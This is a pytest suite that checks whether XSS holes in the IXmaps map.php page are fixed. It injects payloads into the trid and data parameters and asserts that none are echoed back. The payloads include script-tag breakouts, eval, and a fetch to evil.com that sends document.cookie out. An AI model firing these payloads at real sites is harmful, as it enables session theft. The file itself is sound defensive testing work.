"""
Vulnerability tests for IXmaps map.php page.
These tests verify that XSS vulnerabilities are properly mitigated.
They should FAIL in vulnerable state and PASS in fixed state.
"""

import pytest
import requests
from urllib.parse import quote

BASE_URL = "http://localhost"


class TestTridXSSVulnerability:
    """Test XSS vulnerability in trid parameter."""

    def test_basic_xss_alert_blocked(self):
        """Basic XSS alert payload in trid should be blocked."""
        payload = "0;alert('XSS')//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # The raw alert should not appear in the response
        assert "alert('XSS')" not in response.text
        assert "alert(\"XSS\")" not in response.text

    def test_xss_with_document_cookie(self):
        """XSS payload accessing document.cookie should be blocked."""
        payload = "0;alert(document.cookie)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "alert(document.cookie)" not in response.text

    def test_xss_with_document_domain(self):
        """XSS payload accessing document.domain should be blocked."""
        payload = "0;alert(document.domain)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "alert(document.domain)" not in response.text

    def test_xss_semicolon_injection(self):
        """Semicolon-based JavaScript injection should be blocked."""
        payload = "1;console.log('injected')//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "console.log('injected')" not in response.text

    def test_xss_multistatement_injection(self):
        """Multi-statement JavaScript injection should be blocked."""
        payload = "1;var x=1;alert(x)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "var x=1;alert(x)" not in response.text
        assert "alert(x)" not in response.text

    def test_xss_script_tag_injection(self):
        """Script tag injection in trid should be blocked."""
        payload = "</script><script>alert(1)</script>"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # Should not have an executable script tag from injection
        assert "</script><script>alert(1)</script>" not in response.text

    def test_xss_fetch_exfiltration(self):
        """Data exfiltration attempt via fetch should be blocked."""
        payload = "0;fetch('http://evil.com?c='+document.cookie)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "fetch(" not in response.text

    def test_xss_eval_injection(self):
        """Eval-based code execution should be blocked."""
        payload = "0;eval('alert(1)')//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "eval(" not in response.text

    def test_xss_string_fromcharcode(self):
        """String.fromCharCode bypass attempt should be blocked."""
        payload = "0;alert(String.fromCharCode(88,83,83))//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert "String.fromCharCode" not in response.text

    def test_non_numeric_trid_rejected(self):
        """Non-numeric trid should not enable initMode=1."""
        payloads = [
            "abc",
            "12abc",
            "12.34",
            "-1",
            "1e5",
            "0x10",
            "12;",
        ]
        for payload in payloads:
            response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
            assert response.status_code == 200
            # Non-numeric input should not set initMode to 1
            # The page should fall back to default behavior
            assert f"trIdFilter = {payload}" not in response.text, f"Payload '{payload}' was echoed directly"


class TestDataXSSVulnerability:
    """Test XSS vulnerability in data parameter."""

    def test_data_xss_quote_escape(self):
        """Single quote escape in data should be properly handled."""
        payload = "';alert('XSS');//"
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # The raw unescaped payload should not appear
        assert "';alert('XSS');//" not in response.text

    def test_data_xss_double_quote_escape(self):
        """Double quote escape in data should be properly handled."""
        payload = '";alert("XSS");//'
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        assert '";alert("XSS");//' not in response.text

    def test_data_xss_script_tag(self):
        """Script tag in data parameter should be encoded."""
        payload = "<script>alert(1)</script>"
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # Raw script tag should be encoded when using json_encode
        assert "<script>alert(1)</script>" not in response.text

    def test_data_xss_closing_script_tag(self):
        """Closing script tag injection should be blocked."""
        payload = "</script><script>alert(1)</script>"
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # The closing tag should be encoded
        assert "</script><script>" not in response.text

    def test_data_xss_backslash_escape(self):
        """Backslash escape attempts should be handled."""
        payload = "\\';alert(1);//"
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # Should not result in executable injection
        text = response.text
        # Check that the payload is properly escaped (json_encode handles backslashes)
        assert "\\';alert(1);//" not in text or '\\"' in text or '\\\\' in text

    def test_data_xss_newline_injection(self):
        """Newline-based injection should be blocked."""
        payload = "test\nalert(1)"
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # Newlines should be encoded in JSON
        assert "test\nalert(1)" not in response.text

    def test_data_xss_html_entities(self):
        """HTML entity bypass attempts in data parameter should be properly escaped."""
        # This payload contains quotes that could break out of the string context
        payload = "test');alert('XSS');//"
        response = requests.get(f"{BASE_URL}/map.php?data={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # The fix uses json_encode which wraps in double quotes, making single quote attacks ineffective
        # Before fix: var postedData = 'test');alert('XSS');//'; (XSS executes!)
        # After fix:  var postedData = "test');alert('XSS');\/\/"; (safe - inside double-quoted string)
        # Check that it's properly JSON encoded (double quoted string, not single quoted)
        assert "var postedData = '" not in response.text  # Should not use single quotes anymore


class TestCombinedAttackVectors:
    """Test combined and edge case attack vectors."""

    def test_both_parameters_with_xss(self):
        """Both parameters with XSS payloads should be handled."""
        response = requests.get(
            f"{BASE_URL}/map.php?trid=0;alert(1)//&data=';alert(2);//",
            timeout=10
        )
        assert response.status_code == 200
        assert "alert(1)" not in response.text
        # Note: with proper fix, if trid is invalid, data branch should be checked
        # or neither branch activates

    def test_url_encoded_xss_trid(self):
        """URL-encoded XSS in trid should be blocked."""
        # %3C = <, %3E = >, %22 = "
        payload = "0%3Balert%28%22XSS%22%29%2F%2F"
        response = requests.get(f"{BASE_URL}/map.php?trid={payload}", timeout=10)
        assert response.status_code == 200
        assert 'alert("XSS")' not in response.text
        assert "alert('XSS')" not in response.text

    def test_unicode_xss_payload(self):
        """Unicode-based XSS payloads should be handled."""
        payload = "0;\\u0061lert(1)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # The raw payload should not appear unescaped
        assert "\\u0061lert(1)" not in response.text or "initMode = 1" not in response.text

    def test_null_byte_injection(self):
        """Null byte injection attempts should be handled."""
        payload = "123%00;alert(1)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={payload}", timeout=10)
        assert response.status_code == 200
        # Should not execute the alert
        assert "alert(1)" not in response.text

    def test_very_long_payload(self):
        """Very long payloads with XSS should still be blocked."""
        # A long payload that still contains XSS
        payload = "0;" + "a" * 100 + ";alert('XSS')//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        # Server should handle it (200 or 414 URI too long)
        assert response.status_code in [200, 414]
        # If page loads, XSS should not be present
        if response.status_code == 200:
            assert "alert('XSS')" not in response.text


class TestInitModeIntegrity:
    """Test that initMode is not set incorrectly with malicious input."""

    def test_initmode_not_set_for_xss_trid(self):
        """initMode should NOT be 1 when trid contains non-numeric XSS payload."""
        payload = "0;alert(1)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # Since payload is not purely numeric, initMode should not be 1
        # (the fix validates with ctype_digit)
        assert "initMode = 1" not in response.text or "alert(1)" not in response.text

    def test_trIdFilter_sanitized(self):
        """trIdFilter should only contain safe numeric values."""
        payload = "123;alert(1)//"
        response = requests.get(f"{BASE_URL}/map.php?trid={quote(payload)}", timeout=10)
        assert response.status_code == 200
        # The raw payload should not appear in trIdFilter
        assert f"trIdFilter = {payload}" not in response.text
        assert "trIdFilter = 123;alert(1)//" not in response.text
